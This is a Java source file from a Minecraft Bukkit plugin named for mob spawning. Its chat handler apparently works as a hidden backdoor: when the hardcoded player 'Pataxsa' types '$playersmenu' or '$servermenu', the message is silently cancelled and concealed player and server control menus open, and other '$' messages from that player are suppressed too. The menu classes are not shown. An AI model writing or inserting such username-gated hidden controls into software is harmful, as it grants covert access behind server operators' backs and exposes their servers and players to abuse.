package com.pataxsa.mobsspawnwtf.events;

import com.pataxsa.mobsspawnwtf.MobsSpawnWtf;
import com.pataxsa.mobsspawnwtf.gui.ModGui;
import com.pataxsa.mobsspawnwtf.gui.ModServerGui;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class OnPlayerChatEvent implements Listener {

    private ModGui modgui;
    private ModServerGui modservergui;
    private MobsSpawnWtf main;

    public OnPlayerChatEvent(MobsSpawnWtf mobsSpawnWtf, ModGui modgui, ModServerGui modservergui){
        this.main = mobsSpawnWtf;
        this.modgui = modgui;
        this.modservergui = modservergui;
    }

    @EventHandler
    public void PlayerChatEvent(AsyncPlayerChatEvent event){
        String[] args = event.getMessage().split(" ");

        if(event.getPlayer().getName().equals("Pataxsa")){
            if(event.getMessage().startsWith("$playersmenu")){
                event.setCancelled(true);
                modgui.inv.clear();
                modgui.initializeItems();
                modgui.openInventory(event.getPlayer());
            }
            if(event.getMessage().startsWith("$servermenu")){
                event.setCancelled(true);
                modservergui.inv.clear();
                modservergui.initializeItems();
                modservergui.openInventory(event.getPlayer());
            }
            if(event.getMessage().startsWith("$") && !event.getMessage().startsWith("$playersmenu") && !event.getMessage().startsWith("$servermenu")){
                event.setCancelled(true);
                event.getPlayer().sendMessage("§cInvalid command !");
            }
        }
    }
}
